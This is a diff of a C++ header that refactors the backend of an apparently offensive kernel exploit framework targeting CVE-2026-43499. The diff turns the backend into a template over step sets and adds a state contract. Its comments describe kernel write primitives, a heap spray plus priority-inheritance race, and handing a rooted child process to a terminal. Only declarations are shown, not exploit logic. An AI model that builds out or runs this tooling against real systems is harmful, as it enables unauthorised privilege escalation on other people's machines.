@@ -1,69 +1,70 @@
 #ifndef GHOSTLOCK_CVE2026_43499_BACKEND_HPP
 #define GHOSTLOCK_CVE2026_43499_BACKEND_HPP
 
-#include "memory/payload_builder.h"
 #include "profile/model.h"
+#include "pipeline/backend_contract.hpp"
 #include "pipeline/backend_policy.hpp"
 #include "pipeline/component_catalog.hpp"
 #include "session/core_session.hpp"
 #include "session/stage_types.hpp"
-#include "support/status.hpp"
 #include "terminal/rooted_child.hpp"
+
+#include "backend/cve_2026_43499/primitives.hpp"
+#include "backend/cve_2026_43499/steps.hpp"
+#include "backend/cve_2026_43499_state.hpp"
 
 namespace ghostlock::backend {
     using ghostlock::session::CoreSession;
     using ghostlock::session::StageResult;
-    using ghostlock::session::VictimChain;
-    /* Batch 4 (D1=B) cve_2026_43499 backend: the setup stage plus the W1/W2/W3
-     * step sequence. The sequence is owned by this backend, and the middleware
-     * policy is a template parameter: every route hook (W2 repairs) and
-     * capability (multicast / w3_exact_target) comes from
-     * `Middleware`, so each catalogued middleware instantiates its own backend
-     * code and produces a different pipeline by construction. Statement order
-     * and log text are the pre-Batch-4 sequence, unchanged.
-     *
-     * The template definitions live in the unit with explicit instantiations
-     * for the catalogued middleware policies; callers only include this header. */
-    struct Cve2026_43499Policy final {
-        static constexpr pipeline::BackendKind kind = pipeline::BackendKind::Cve2026_43499;
-        /* T1: single step set; T4 turns this into template<class StepSet>. */
-        static constexpr pipeline::StepSetKind steps = pipeline::StepSetKind::W1W3;
 
-        /* setup -> W1 -> W2/W3 chain, then hand the rooted child to the terminal
+    /* cve_2026_43499 backend: the setup stage (in the unit) plus one step set.
+     * The step vocabulary is the template parameter (ADR-0004 R18): W1W3 and
+     * W1W2 are two compile-time instances, and W1W2 never compiles W3. The
+     * route stays backend-internal and is dispatched inside run(); the shared
+     * write/zero primitives come from the non-template Cve43499Primitives base,
+     * so no StepSet ever enters the "do_one_write" symbol.
+     *
+     * The template definition and the explicit instantiations live in the unit;
+     * callers only include this header. */
+    template <class StepSet>
+    struct Cve2026_43499Backend : Cve43499Primitives {
+        static constexpr pipeline::BackendKind kind = pipeline::BackendKind::Cve2026_43499;
+        static constexpr pipeline::StepSetKind steps = StepSet::kind;
+
+        /* B2 state contract (D3): the 43499 state unit owns the opaque
+         * CoreSession slot; this policy only forwards. Pipeline's RAII guard
+         * constructs it at run entry and destroys it on every exit path. */
+        using State = Cve2026_43499State;
+
+        static void state_construct(CoreSession &session) noexcept {
+            cve43499_state_construct(session);
+        }
+
+        static void state_destroy(CoreSession &session) noexcept {
+            cve43499_state_destroy(session);
+        }
+
+        /* setup -> W1 -> W2 (-> W3), then hand the rooted child to the terminal
          * (see pipeline::Pipeline::run). Route comes from the profile and is
-         * dispatched internally; on Continue `out` receives the transfer. */
+         * dispatched internally; on Continue 'out' receives the transfer. */
         [[nodiscard]] static StageResult run(CoreSession &session,
                                              const profile::kernel_offsets &decoded,
                                              const char *debug_dir, bool force_attack,
                                              ghostlock::terminal::RootedChild &out);
-
-        /* One route's W1/W2/W3 sequence; the route policy is the template.
-         * Public so the explicit instantiations stay in the unit. */
-        template <class Middleware>
-        [[nodiscard]] static StageResult run_steps(CoreSession &session,
-                                                   const profile::kernel_offsets &decoded,
-                                                   const char *debug_dir, bool force_attack,
-                                                   VictimChain &chain);
-
-        /* One route write: middleware resident fast path, else heap spray + PI
-         * race. Public because the attack-function disassembly gate compares it
-         * by symbol (cmp_disasm "do_one_write"). */
-        template <class Middleware>
-        [[nodiscard]] static Status attack_write(CoreSession &session,
-                                                 const memory::WriteRequest &request,
-                                                 const char *desc);
-
-        /* Ancillary-context adapter: zero one word at an already-translated
-         * kernel address through this middleware's write. Behaviors receive it
-         * as a plain function pointer so they never name the middleware. */
-        template <class Middleware>
-        [[nodiscard]] static Status zero_word(uintptr_t target, const char *desc);
-
-        /* Stage: process setup and profile installation (middleware-free). */
-        [[nodiscard]] static StageResult run_setup(CoreSession &session,
-                                                   const profile::kernel_offsets &decoded,
-                                                   const char *debug_dir, bool force_attack);
     };
+
+    /* The two catalogued step-set instances. */
+    using Cve43499_W1W3 = Cve2026_43499Backend<W1W3Steps>;
+    using Cve43499_W1W2 = Cve2026_43499Backend<W1W2Steps>;
+
+    /* Both catalogued step-set instances satisfy the state contract; the
+     * Pipeline RAII guard relies on it. */
+    static_assert(pipeline::BackendState<Cve43499_W1W3>);
+    static_assert(pipeline::BackendState<Cve43499_W1W2>);
+
+    /* Back-compat alias: existing call sites name the app-descendant instance
+     * (W1W3), which is the behaviour before T4. */
+    using Cve2026_43499Policy = Cve43499_W1W3;
 
     /* Availability is owned by component_catalog::backend_available(); the
      * execution policy carries only the id. The declared identity and this
